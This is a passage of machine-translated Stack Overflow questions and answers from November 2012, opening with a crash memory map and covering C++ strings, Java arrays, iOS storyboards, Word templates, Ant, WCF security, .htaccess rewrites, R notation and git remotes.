    7f6b80685000-7f6b8068f000 r-xp 00000000 08:01 6180                       /usr/lib/x86_64-linux-gnu/libdrm.so.2.4.0
    7f6b8068f000-7f6b8088f000 ---p 0000a000 08:01 6180                       /usr/lib/x86_64-linux-gnu/libdrm.so.2.4.0
    7f6b8088f000-7f6b80890000 r--p 0000a000 08:01 6180                       /usr/lib/x86_64-linux-gnu/libdrm.so.2.4.0
    7f6b80890000-7f6b80891000 rw-p 0000b000 08:01 6180                       /usr/lib/x86_64-linux-gnu/libdrm.so.2.4.0
    7f6b80891000-7f6b80895000 r-xp 00000000 08:01 6039                       /usr/lib/x86_64-linux-gnu/libXxf86vm.so.1.0.0
    7f6b80895000-7f6b80a95000 ---p 00004000 08:01 6039                       /usr/lib/x86_64-linux-gnu/libXxf86vm.so.1.0.0
    7f6b80a95000-7f6b80a96000 r--p 00004000 08:01 6039                       /usr/lib/x86_64-linux-gnu/libXxf86vm.so.1.0.0
    7f6b80a96000-7f6b80a97000 rw-p 00005000 08:01 6039                       /usr/lib/x86_64-linux-gnu/libXxf86vm.so.1.0.0
    7f6b80a97000-7f6b80ab4000 r-xp 00000000 08:01 6749                       /usr/lib/x86_64-linux-gnu/libxcb.so.1.1.0
    7f6b80ab4000-7f6b80cb3000 ---p 0001d000 08:01 6749                       /usr/lib/x86_64-linux-gnu/libxcb.so.1.1.0
    7f6b80cb3000-7f6b80cb4000 r--p 0001c000 08:01 6749                       /usr/lib/x86_64-linux-gnu/libxcb.so.1.1.0
    7f6b80cb4000-7f6b80cb5000 rw-p 0001d000 08:01 6749                       /usr/lib/x86_64-linux-gnu/libxcb.so.1.1.0
    7f6b80cb5000-7f6b80cca000 r-xp 00000000 08:01 6739                       /usr/lib/x86_64-linux-gnu/libxcb-glx.so.0.0.0
    7f6b80cca000-7f6b80ec9000 ---p 00015000 08:01 6739                       /usr/lib/x86_64-linux-gnu/libxcb-glx.so.0.0.0
    7f6b80ec9000-7f6b80ecb000 r--p 00014000 08:01 6739                       /usr/lib/x86_64-linux-gnu/libxcb-glx.so.0.0.0
    7f6b80ecb000-7f6b80ecc000 rw-p 00016000 08:01 6739                       /usr/lib/x86_64-linux-gnu/libxcb-glx.so.0.0.0
    7f6b80ecc000-7f6b80ecd000 r-xp 00000000 08:01 5990                       /usr/lib/x86_64-linux-gnu/libX11-xcb.so.1.0.0
    7f6b80ecd000-7f6b810cc000 ---p 00001000 08:01 5990                       /usr/lib/x86_64-linux-gnu/libX11-xcb.so.1.0.0
    7f6b810cc000-7f6b810cd000 r--p 00000000 08:01 5990                       /usr/lib/x86_64-linux-gnu/libX11-xcb.so.1.0.0
    7f6b810cd000-7f6b810ce000 rw-p 00001000 08:01 5990                       /usr/lib/x86_64-linux-gnu/libX11-xcb.so.1.0.0
    7f6b810ce000-7f6b810d3000 r-xp 00000000 08:01 6011                       /usr/lib/x86_64-linux-gnu/libXfixes.so.3.1.0
    7f6b810d3000-7f6b812d2000 ---p 00005000 08:01 6011                       /usr/lib/x86_64-linux-gnu/libXfixes.so.3.1.0
    7f6b812d2000-7f6b812d3000 r--p 00004000 08:01 6011                       /usr/lib/x86_64-linux-gnu/libXfixes.so.3.1.0
    7f6b812d3000-7f6b812d4000 rw-p 00005000 08:01 6011                       /usr/lib/x86_64-linux-gnu/libXfixes.so.3.1.0
    7f6b812d4000-7f6b812d6000 r-xp 00000000 08:01 6005                       /usr/lib/x86_64-linux-gnu/libXdamage.so.1.1.0
    7f6b812d6000-7f6b814d5000 ---p 00002000 08:01 6005                       /usr/lib/x86_64-linux-gnu/libXdamage.so.1.1.0
    7f6b814d5000-7f6b814d6000 r--p 00001000 08:01 6005                       /usr/lib/x86_64-linux-gnu/libXdamage.so.1.1.0
    7f6b814d6000-7f6b814d7000 rw-p 00002000 08:01 6005                       /usr/lib/x86_64-linux-gnu/libXdamage.so.1.1.0
    7f6b814d7000-7f6b814e7000 r-xp 00000000 08:01 6009                       /usr/lib/x86_64-linux-gnu/libXext.so.6.4.0
    7f6b814e7000-7f6b816e7000 ---p 00010000 08:01 6009                       /usr/lib/x86_64-linux-gnu/libXext.so.6.4.0
    7f6b816e7000-7f6b816e8000 r--p 00010000 08:01 6009                       /usr/lib/x86_64-linux-gnu/libXext.so.6.4.0
    7f6b816e8000-7f6b816e9000 rw-p 00011000 08:01 6009                       /usr/lib/x86_64-linux-gnu/libXext.so.6.4.0
    7f6b816e9000-7f6b8170a000 r-xp 00000000 08:01 6280                       /usr/lib/x86_64-linux-gnu/libglapi.so.0.0.0
    7f6b8170a000-7f6b8190a000 ---p 00021000 08:01 6280                       /usr/lib/x86_64-linux-gnu/libglapi.so.0.0.0
    7f6b8190a000-7f6b8190d000 r--p 00021000 08:01 6280                       /usr/lib/x86_64-linux-gnu/libglapi.so.0.0.0
    7f6b8190d000-7f6b8190e000 rw-p 00024000 08:01 6280                       /usr/lib/x86_64-linux-gnu/libglapi.so.0.0.0
    7f6b8190e000-7f6b8190f000 rw-p 00000000 00:00 0 
    7f6b8190f000-7f6b81916000 r-xp 00000000 08:01 921746                     /lib/x86_64-linux-gnu/librt-2.15.so
    7f6b81916000-7f6b81b15000 ---p 00007000 08:01 921746                     /lib/x86_64-linux-gnu/librt-2.15.so
    7f6b81b15000-7f6b81b16000 r--p 00006000 08:01 921746                     /lib/x86_64-linux-gnu/librt-2.15.so
    7f6b81b16000-7f6b81b17000 rw-p 00007000 08:01 921746                     /lib/x86_64-linux-gnu/librt-2.15.so
    7f6b81b17000-7f6b81ccc000 r-xp 00000000 08:01 921642                     /lib/x86_64-linux-gnu/libc-2.15.so
    7f6b81ccc000-7f6b81ecb000 ---p 001b5000 08:01 921642                     /lib/x86_64-linux-gnu/libc-2.15.so
    7f6b81ecb000-7f6b81ecf000 r--p 001b4000 08:01 921642                     /lib/x86_64-linux-gnu/libc-2.15.so
    7f6b81ecf000-7f6b81ed1000 rw-p 001b8000 08:01 921642                     /lib/x86_64-linux-gnu/libc-2.15.so
    7f6b81ed1000-7f6b81ed6000 rw-p 00000000 00:00 0 
    7f6b81ed6000-7f6b81eeb000 r-xp 00000000 08:01 921667                     /lib/x86_64-linux-gnu/libgcc_s.so.1
    7f6b81eeb000-7f6b820ea000 ---p 00015000 08:01 921667                     /lib/x86_64-linux-gnu/libgcc_s.so.1
    7f6b820ea000-7f6b820eb000 r--p 00014000 08:01 921667                     /lib/x86_64-linux-gnu/libgcc_s.so.1
    7f6b820eb000-7f6b820ec000 rw-p 00015000 08:01 921667                     /lib/x86_64-linux-gnu/libgcc_s.so.1
    7f6b820ec000-7f6b821e7000 r-xp 00000000 08:01 921684                     /lib/x86_64-linux-gnu/libm-2.15.so
    7f6b821e7000-7f6b823e6000 ---p 000fb000 08:01 921684                     /lib/x86_64-linux-gnu/libm-2.15.so
    7f6b823e6000-7f6b823e7000 r--p 000fa000 08:01 921684                     /lib/x86_64-linux-gnu/libm-2.15.so
    7f6b823e7000-7f6b823e8000 rw-p 000fb000 08:01 921684                     /lib/x86_64-linux-gnu/libm-2.15.so
    7f6b823e8000-7f6b824cd000 r-xp 00000000 08:01 6655                       /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.17
    7f6b824cd000-7f6b826cc000 ---p 000e5000 08:01 6655                       /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.17
    7f6b826cc000-7f6b826d4000 r--p 000e4000 08:01 6655                       /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.17
    7f6b826d4000-7f6b826d6000 rw-p 000ec000 08:01 6655                       /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.17
    7f6b826d6000-7f6b826eb000 rw-p 00000000 00:00 0 
    7f6b826eb000-7f6b82704000 r-xp 00000000 08:01 1065917                    /usr/local/lib/libz.so.1.2.5
    7f6b82704000-7f6b82903000 ---p 00019000 08:01 1065917                    /usr/local/lib/libz.so.1.2.5
    7f6b82903000-7f6b82904000 r--p 00018000 08:01 1065917                    /usr/local/lib/libz.so.1.2.5
    7f6b82904000-7f6b82905000 rw-p 00019000 08:01 1065917                    /usr/local/lib/libz.so.1.2.5
    7f6b82905000-7f6b82944000 r-xp 00000000 08:01 6426                       /usr/lib/x86_64-linux-gnu/libjpeg.so.8.0.2
    7f6b82944000-7f6b82b44000 ---p 0003f000 08:01 6426                       /usr/lib/x86_64-linux-gnu/libjpeg.so.8.0.2
    7f6b82b44000-7f6b82b45000 r--p 0003f000 08:01 6426                       /usr/lib/x86_64-linux-gnu/libjpeg.so.8.0.2
    7f6b82b45000-7f6b82b46000 rw-p 00040000 08:01 6426                       /usr/lib/x86_64-linux-gnu/libjpeg.so.8.0.2
    7f6b82b46000-7f6b82b56000 rw-p 00000000 00:00 0 
    7f6b82b56000-7f6b82bce000 r-xp 00000000 08:01 5921                       /usr/lib/x86_64-linux-gnu/libGLEW.so.1.8.0
    7f6b82bce000-7f6b82dcd000 ---p 00078000 08:01 5921                       /usr/lib/x86_64-linux-gnu/libGLEW.so.1.8.0
    7f6b82dcd000-7f6b82dd3000 r--p 00077000 08:01 5921                       /usr/lib/x86_64-linux-gnu/libGLEW.so.1.8.0
    7f6b82dd3000-7f6b82dd4000 rw-p 0007d000 08:01 5921                       /usr/lib/x86_64-linux-gnu/libGLEW.so.1.8.0
    7f6b82dd4000-7f6b82dd8000 rw-p 00000000 00:00 0 
    7f6b82dd8000-7f6b82de1000 r-xp 00000000 08:01 6027                       /usr/lib/x86_64-linux-gnu/libXrandr.so.2.2.0
    7f6b82de1000-7f6b82fe0000 ---p 00009000 08:01 6027                       /usr/lib/x86_64-linux-gnu/libXrandr.so.2.2.0
    7f6b82fe0000-7f6b82fe1000 r--p 00008000 08:01 6027                       /usr/lib/x86_64-linux-gnu/libXrandr.so.2.2.0
    7f6b82fe1000-7f6b82fe2000 rw-p 00009000 08:01 6027                       /usr/lib/x86_64-linux-gnu/libXrandr.so.2.2.0
    7f6b82fe2000-7f6b83116000 r-xp 00000000 08:01 5992                       /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
    7f6b83116000-7f6b83316000 ---p 00134000 08:01 5992                       /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
    7f6b83316000-7f6b83317000 r--p 00134000 08:01 5992                       /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
    7f6b83317000-7f6b8331c000 rw-p 00135000 08:01 5992                       /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
    7f6b8331c000-7f6b8337c000 r-xp 00000000 08:01 264024                     /usr/lib/x86_64-linux-gnu/mesa/libGL.so.1.2.0
    7f6b8337c000-7f6b8357c000 ---p 00060000 08:01 264024                     /usr/lib/x86_64-linux-gnu/mesa/libGL.so.1.2.0
    7f6b8357c000-7f6b8357e000 r--p 00060000 08:01 264024                     /usr/lib/x86_64-linux-gnu/mesa/libGL.so.1.2.0
    7f6b8357e000-7f6b8357f000 rw-p 00062000 08:01 264024                     /usr/lib/x86_64-linux-gnu/mesa/libGL.so.1.2.0
    7f6b8357f000-7f6b83580000 rw-p 00000000 00:00 0 
    7f6b83580000-7f6b83598000 r-xp 00000000 08:01 921738                     /lib/x86_64-linux-gnu/libpthread-2.15.so
    7f6b83598000-7f6b83797000 ---p 00018000 08:01 921738                     /lib/x86_64-linux-gnu/libpthread-2.15.so
    7f6b83797000-7f6b83798000 r--p 00017000 08:01 921738                     /lib/x86_64-linux-gnu/libpthread-2.15.so
    7f6b83798000-7f6b83799000 rw-p 00018000 08:01 921738                     /lib/x86_64-linux-gnu/libpthread-2.15.so
    7f6b83799000-7f6b8379d000 rw-p 00000000 00:00 0 
    7f6b8379d000-7f6b837bf000 r-xp 00000000 08:01 921620                     /lib/x86_64-linux-gnu/ld-2.15.so
    7f6b8399d000-7f6b839aa000 rw-p 00000000 00:00 0 
    7f6b839bc000-7f6b839bf000 rw-p 00000000 00:00 0 
    7f6b839bf000-7f6b839c0000 r--p 00022000 08:01 921620                     /lib/x86_64-linux-gnu/ld-2.15.so
    7f6b839c0000-7f6b839c2000 rw-p 00023000 08:01 921620                     /lib/x86_64-linux-gnu/ld-2.15.so
    7fff110d9000-7fff110fa000 rw-p 00000000 00:00 0                          [stack]
    7fff1110e000-7fff1110f000 r-xp 00000000 00:00 0                          [vdso]
    ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
    Aborted (core dumped) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:02:58.027

问题是通过使用`sizeof(s)`你得到类的大小`std::string`而不是你需要输入的字符串。尝试替换这个：

```
int sizeOfS = sizeof(s); 
```

为了这：

```
int sizeOfS = s.length() + 1; 
```

“+ 1”用于空终止符，它会自动附加到`c_str()`.

# java - 搜索具有多种数据类型的 ArrayList

> ID：13572145
> 
> 赞同：0
> 
> 时间：2012-11-26T19:58:02.587
> 
> 标签：java, arrays, arraylist

我有一个 ArrayList `String`，`int`其中`double`包含 20 个元素。

我试图将 移至`Strings`字符串数组、`ints`移至 int 数组和`doubles`移至双数组。但我不知道如何，这就是我寻找整数的方法：

```
 private ArrayList <Object> randomList = new ArrayList <Object>();
    private int [] intArray = new int[10];

    public void example(){
    createArray();
    for(int i = 0; i<randomList.size();i++){
        if(randomList.get(i)instanceof Integer){
            intArray[i]= (Integer) randomList.get(i);
        }
    }
} 
```

我不明白为什么这个 dosnt 起作用，它试图将不是整数的对象添加到我的数组中，导致 outOfBounds 异常，因为它试图添加超过 10 个元素。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T19:59:46.737

您有索引不匹配，仅此而已。尝试类似：

```
int index = 0;

for(int i = 0; i<randomList.size();i++)
{
        if(randomList.get(i)instanceof Integer)
        {
            intArray[index++]= (Integer) randomList.get(i);
        }
} 
```

您还应该检查特定数组的当前索引是否小于上限，即该数组的初始大小：

```
if(randomList.get(i) instanceof Integer && index < intArray.length) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T19:59:54.633

您需要为每个输出数组维护一个单独的索引。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:00:18.640

Well first of all you should never have allowed all these data types to congregate in on ArrayList of objects. But if you already have them:

```
for(Object o : randomList)
{
    if(o instanceof Integer)
    {
        //add to inteeger list
    }
    else if(o intenaceof String)
    {
       //add to string list
    }
    //...etc
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-26T20:00:33.433

1.  Try initializing your array as :

    ```
    private int [] intArray = new int[randomList.size()]; 
    ```

2.  Try another index to assign values to array:

    ```
    int count=0;
    for(int i = 0; i<randomList.size();i++){
        if(randomList.get(i)instanceof Integer){
           intArray[count++] = (Integer) randomList.get(i);
        }
    } 
    ```

3.  In the end, you may want to truncate the array fragment which was unused using `System.arraycopy` as below:

    ```
    private int [] finalArray= new int[count;
    System.arraycopy(intArray, 0, finalArray, 0, count); 
    ```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-26T20:01:02.460

```
private int [] intArray = new int[10]; 
```

Your array has a size of 10, but your list does not have a size limit.

```
private int [] intArray = new int[randomList.size()]; 
```

might work.

# iphone - 仅第一次启动 UiView Storyboard

> ID：13572153
> 
> 赞同：1
> 
> 时间：2012-11-26T19:58:20.607
> 
> 标签：iphone, xcode, storyboard

我正在创建一个 iPhone 应用程序，其中只有第一次用户应该选择将被存储且不再需要的参数。我问自己如何使用只出现一次的故事板来创建视图。你能帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:01:02.900

通常，任何只需要在视图中初始化一次的参数都会进入“viewDidLoad”方法。由于您正在从情节提要加载 viewController，因此只需查找该方法并将初始化参数放在那里。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:18:46.257

当应用程序启动时，检查设置屏幕是否曾经显示过。如果以前从未显示过，请使用`UIViewController`'`- (void)presentViewController:(UIViewController *)viewControllerToPresent animated:(BOOL)flag completion:(void (^)(void))completion`方法以模态方式显示设置视图。

```
// CHECK IF HAVE SHOWN SETTINGS
NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
BOOL hasShownSettings = [ud boolForKey: @"hasShownSettings"];

// SHOW SETTINGS VIEW
if (!hasShownSettings) {
    YourViewController *settingsVC = [[YourViewController alloc] init];
    [self presentViewController: settingsVC animated: YES completion:^{

        // SAVE THAT WE HAVE SHOWN SETTINGS PAGE
        [ud setBool: YES forKey: @"hasShownSettings"];
    }];
} 
```

# ms-word - 在 Word 中禁用文档模板链接

> ID：13572162
> 
> 赞同：2
> 
> 时间：2012-11-26T19:58:59.687
> 
> 标签：ms-word, ms-office, documents, word-2007, word-2010

通过我们的软件，我们的客户可以根据我们提供的大量模板创建 Word 文档。这在最近网站移动服务器时给我们带来了一些问题，因为从模板创建的文档具有指向原始模板路径的链接，并且在打开创建的文档时尝试连接到该路径（即使打开了“自动更新文档样式”离开）。

因此，当这些站点移动服务器时，在尝试解析不再存在的网络路径时，打开文档可能会有很大的、不可接受的延迟。

我已经找到了处理现有文档的方法（见下文），但我想阻止这个问题在未来传播。

**有谁知道如何设置 Word 以使从模板创建的新文档没有指向模板的链接？（所以只需使用 Normal 代替）。**

谢谢

此外，如果其他阅读本文的人遇到此问题，以下链接应该会有所帮助：

[用于清除附加模板链接的 Powershell 脚本。](http://www.oostdam.info/index.php/sectie-blog/51-scripting/322-empty-wrong-word-template-path)

[用于控制文档尝试连接到模板路径时的超时时间的注册表设置。](http://support.microsoft.com/kb/970270)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T17:30:14.530

在模板的 VBA 中，您可以使用该`AttachedTemplate`属性将 Normal 模板（或任何其他模板）附加到新文档。例如：

```
 Private Sub Document_New()

 ActiveDocument.AttachedTemplate = "C:\Users\Joe\AppData\Roaming\Microsoft\Templates\Normal.dotm"

 End Sub 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-28T08:11:15.693

正确的方法是：

```
Private Sub Document_New()

   ActiveDocument.AttachedTemplate = ""

End Sub 
```

这将引用 normal.dotm。

# ant - Ant - 如何将 ${ant.project.name} 设置为项目文件夹名称？

> ID：13572174
> 
> 赞同：4
> 
> 时间：2012-11-26T19:59:47.393
> 
> 标签：ant

如何设置 ${ant.project.name} 值？我想将其设置为：${ant.project.name}=${basedir}

我不想从 build.xml 设置项目名称。我的想法是 - 它应该自动取文件夹的名称。

这可能吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-27T05:48:26.367

The ANT property **ant.project.name** is designed to return the string that appears at the top of your build file. It has special meaning and shouldn't really be changed.

The following example demonstrates how you could use an alternative property (This should work on windows as well):

```
<project name="demo" default="run">

    <basename property="my.project.name" file="${basedir}"/>

    <target name="run">
        <echo message="ant.project.name=${ant.project.name}"/>
        <echo message="my.project.name=${my.project.name}"/>
    </target>

</project> 
```

Has the following output

```
run:
     [echo] ant.project.name=demo
     [echo] my.project.name=myprojectdirname 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T04:11:59.360

当您可以设置您心中想要的任何其他属性时，为什么您如此热衷于设置此特定属性？这也真的没有任何意义。项目的名称完全独立于您将其签出到的目录的名称。

但是，如果您坚持，您可以`${ant.project.name}`通过不在`<project>`实体中设置来设置：

```
<project basedir="." default="package"> <!-- Notice no name! -->
    <basename property="ant.project.name"
        file="${basedir}"/>

    <target name="package">
        <echo>The name of this project is ${ant.project.name}</echo>
    </target>
</project> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:38:18.330

该`ant.project.name`属性由 Ant 在运行时设置，不能更改。[Ant 网站上记录](http://ant.apache.org/manual/properties.html)了一些这样的内置参数。 如果您需要可以更改的属性，您可能会对[ant contrib 的 var 感兴趣。](http://ant-contrib.sourceforge.net/tasks/tasks/variable_task.html)

# deployment - 如何在表面上测试 Windows8 应用程序

> ID：13572178
> 
> 赞同：8
> 
> 时间：2012-11-26T19:59:53.820
> 
> 标签：deployment, windows-8, microsoft-metro

如何将我构建的 Windows8 应用程序移植到 Surface 上？我使用 Visual Studio 构建了该应用程序，只需按 F5 即可在台式机上对其进行测试。如何将它放到 Surface 上进行测试，而无需将其发布到商店？谢谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-26T20:04:59.363

此链接说明如何使用远程调试在 Surface 上测试您的应用程序：http: [//timheuer.com/blog/archive/2012/10/26/remote-debugging-windows-store-apps-on-surface-arm-devices .aspx](http://timheuer.com/blog/archive/2012/10/26/remote-debugging-windows-store-apps-on-surface-arm-devices.aspx)

快速总结：
1\. 下载 Visual Studio 2012 的远程工具（从[此处](http://aka.ms/JenVS2012)，在底部附近的“附加软件”下）并将它们安装在 Surface 上。
2\. 在 Surface 上启动远程调试器并进行配置。让它运行并“倾听”。
3\. 返回您的开发机器，在 Visual Studio 2012 中，将“运行”下拉菜单更改为“远程机器”。运行并选择您的设备。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-26T20:17:49.613

您需要安装[**远程工具**](http://www.microsoft.com/visualstudio/eng/downloads#remote-tools)并配置 Visual Studio 以在远程计算机上进行调试。其余的很简单。

更多详情[：](http://timheuer.com/blog/archive/2012/10/26/remote-debugging-windows-store-apps-on-surface-arm-devices.aspx)
[这里](http://msdn.microsoft.com/en-us/library/windows/apps/hh441469.aspx)

# .net - 如何使用 Windows 为客户端设置 WCF 传输安全性，为安全新手设置服务？

> ID：13572179
> 
> 赞同：4
> 
> 时间：2012-11-26T19:59:54.710
> 
> 标签：.net, wcf, wcf-security, ws-security

我对 WCF 服务，尤其是对安全性非常陌生 - 并且对所有安全选项感到有点不知所措。

我们目前正在运行 Windows 机器的 Intranet 中实现 WCF 服务（服务和客户端）。所以我考虑使用 Windows 凭据作为传输安全机制。

但我想我需要一些帮助：

1.  在 WCF 服务的配置中添加传输安全设置后，客户端配置在更新服务引用后包含一个名为 userprincipalname 的元素。这让我感到困惑，因为我认为用户将是运行应用程序的 Windows 用户，它调用服务，而不是客户端配置中的一些硬编码值。那么为什么在客户端配置中指定用户？

2.  Windows 是否会自动将正确的用户从客户端传递给服务，或者我是否需要在客户端添加任何特殊代码来“设置”正确的用户？我们将从 Windows 窗体客户端调用 WCF 服务。

    （如果重要的话，我们将在 Windows 服务中自行托管该服务——为了测试，我在自己的帐户下运行该服务。）

谢谢大家！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-27T10:17:11.540

看看这个： http: [//msdn.microsoft.com/en-us/library/ms733089 (v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/ms733089(v=vs.100).aspx)

具有客户端和服务器的配置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-27T10:13:29.703

本主题可能对您有所帮助： http: [//social.msdn.microsoft.com/Forums/en/wcf/thread/0aac0110-187e-4a00-a597-f15b768cf16c](http://social.msdn.microsoft.com/Forums/en/wcf/thread/0aac0110-187e-4a00-a597-f15b768cf16c)

# java - Java：参数实现的内部类中不需要的类型擦除

> ID：13572180
> 
> 赞同：2
> 
> 时间：2012-11-26T20:00:03.353
> 
> 标签：java, types, inner-classes, type-erasure

好的，所以我有一个参数接口，它的实现有一个内部类。似乎我不能以任何方式引用内部类的完整（通用）类型，因为它本身没有参数化，并且仅隐式使用封闭类的类型参数：

```
public interface TestA<R> {
   public Class<? extends R> getTheRClass();
}

public class TestB<Z> implements TestA<TestB<Z>.InnerStuff> {

   public class InnerStuff {
       List<R> iCantBeStatic;
   }

   InnerStuff myStuff;

   @Override
   public Class<? extends TestB<Z>.InnerStuff> getTheRClass() {
      // return InnerStuff.class;
      // return myStuff.getClass();
      // return TestB.InnerStuff.class;
      // return TestB<Z>.InnerStuff.class;
      throw new AngryProgrammerException();
   }
} 
```

有没有办法返回有问题的类并让编译器识别正确的类型？是的，我知道有 1,001 种方法可以解决这个问题（使内部类静态、重构因此没有内部类等等）我想知道是否有一个表达式在该覆盖中有效，或者如果不存在这样的表达......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:07:29.207

由于擦除，`Class`您返回的实际实例将在内部只是`TestB.InnerStuff.class`; 该`<Z>`部分在运行时实际上并不存在。所以你的直觉`return TestB.InnerStuff.class`是钱。为了让它工作，你需要做的就是给原始类型添​​加一个强制转换`Class`来说服编译器不要尖叫：

```
return (Class)TestB.InnerStuff.class; 
```

（然后，您可以添加一个注释`@SuppressWarnings({ "unchecked", "rawtypes" })`，告诉您的编译器您不想要警告消息。）

# ajax - AJAX 调用上的 mod_rewrite .htaccess 引发错误

> ID：13572184
> 
> 赞同：2
> 
> 时间：2012-11-26T20:00:18.813
> 
> 标签：ajax, .htaccess, mod-rewrite, redirect, concrete5

我正在为教堂开发一个新网站。旧域名为： **chippingcampdenbaptistchurch.org.uk** 新域名为：**campdenbaptist.org.uk**

campdenbaptist.org.uk 域是 Linux 共享服务器的附加域。在它的文件夹中，它有以下 .htaccess 文件：

```
RewriteEngine On
RewriteRule !^(dev(/.*)?|www\.chippingcampdenbaptistchurch\.org\.uk)$ http://www.chippingcampdenbaptistchurch.org.uk/ [R,L] 
```

基本上，如果用户要求 JUST campdenbaptist.org.uk，那么他们将被发送到旧站点（位于 www.chippingcampdenbaptistchurch.org.uk 的不同服务器上）。但是，如果他们要求 campdenbaptist.org.uk/dev - 那么他们将被发送到新站点所在的 /dev 文件夹中。

它在 Concrete5 ( [http://www.concrete5.org/](http://www.concrete5.org/) ) 上运行，此 /dev 文件夹中的 .htaccess 如下所示：

```
SetEnv TZ Europe/London

<IfModule mod_rewrite.c>

RewriteEngine On

#=============WWW. REDIRECT===========#
RewriteCond %{HTTP_HOST} !^www\.
RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/dev/$1 [R=301,L]

#=============C5 REDIRECT===========#
RewriteBase /dev/
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME}/index.html !-f
RewriteCond %{REQUEST_FILENAME}/index.php !-f
RewriteRule . index.php [L]

</IfModule> 
```

它基本上检查是否 www. 是否存在（如果没有，请附加它）并处理“C5 重定向”块中的漂亮 URL。

我遇到的问题是，有时服务器似乎会为 AJAX 调用抛出错误（重定向到旧站点），例如以下两个：

```
http://www.campdenbaptist.org.uk/dev/tools/blocks/booking_form/snag_dates.php?1=1&date=03/16/2013&page=272 
```

（如果您将查询字符串的第一部分中的 1=1 更改为 a=1 之类的东西，这似乎很好？！） - 或

```
http://www.campdenbaptist.org.uk/dev/tools/required/files/importers/remote?_returntype=text&fIDW&task=update_file&url_upload_1=http%3A%2F%2Ffeatherfiles.aviary.com%2F2012-11-26%2F1d6b111bd5684978a293e193828a181a.jpg&ccm_token53952089%3A5ec7e1b4c88c7e62ba9f5da66b36cef0 
```

有任何想法吗？似乎如果您从上述两个调用中删除查询字符串，则不会发生错误。非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T21:05:11.047

听起来像是您的一个 php 文件中的硬编码重定向，该文件正在检查查询字符串中的 1，或者可能是需要更改的站点地址的配置变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T22:49:10.147

令人讨厌的是，这是由托管服务提供商引起的 mod_sec 错误。1=1 现已修复，他们目前正在处理 .aviary.com 问题。不管怎么说，还是要谢谢你！

# r - R程序输出中的常数e是什么意思？

> ID：13572189
> 
> 赞同：3
> 
> 时间：2012-11-26T20:00:33.900
> 
> 标签：r

我想知道R程序输出中的常数e是什么意思：8.131e-02？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-26T20:01:36.423

是文字版的`10 to the power of`。例如

```
 -02
8.131 x 10     == 8.131e-02 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-26T20:10:25.933

这只是科学计数法的[E 表示](http://en.wikipedia.org/wiki/Scientific_notation#E_notation)法。请参阅链接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T22:13:47.193

由于使用的字符数量，R 将给出 1e+06 而不是 1000000 的输出。

如果要更改输出，请查找 scipen。

# git - 无法删除远程来源

> ID：13572191
> 
> 赞同：48
> 
> 时间：2012-11-26T20:00:41.750
> 
> 标签：git

我在 OS X 上运行 git 1.8.0，每个新的 git repo 似乎都有一个名为“origin”的遥控器：

```
$ git init
$ git remote
origin 
```

奇怪的是我无法删除它：

```
$ git remote remove origin
error: Could not remove config section 'remote.origin' 
```

因此我无法添加一个名为`origin`. 为什么是这样？我能做些什么来改变它？

* * *

## 回答 #1

> 赞同：79
> 
> 时间：2012-11-26T20:05:04.160

你应该可以`origin`删除

```
git remote rm origin 
```

不是你需要，你可以改变`origin`with`set-url`

```
git remote set-url origin "https://..." 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:06:42.133

打开 .git 目录并编辑配置文件 [remote "origin"]

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-05-07T11:00:06.960

我以这种方式解决了我的问题。[首先，我使用vim](http://www.vim.org/)使用以下命令打开`config`文件

```
$ vim .git/config 
```

我将我的文件修改为以下内容：

```
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        ignorecase = true
        precomposeunicode = false
[branch "master"]
[remote "origin"]
        url = git@192.168.200.79:xxx.git
        fetch = +refs/heads/*:refs/remotes/origin_iOS/* 
```

所以现在，当我发出命令`git push`时，它会理解，因为默认情况下它会推送到`origin`并且`origin_iOS`在我的服务器中设置为我的。

`remote -v`您可以通过以下命令检查您的原始配置：

```
$ git remote -v
origin  git@192.168.200.79:xxxx.git (fetch)
origin  git@192.168.200.79:xxx.git (push) 
```

如果你没有，你会像我一样`'origin'`遇到平常的麻烦。`'git push'`我必须输入`'git push origin_iOS master'`，因为我的配置中有`'origin_iOS'`

# java - Android中的图像映射错误？

> ID：13572204
> 
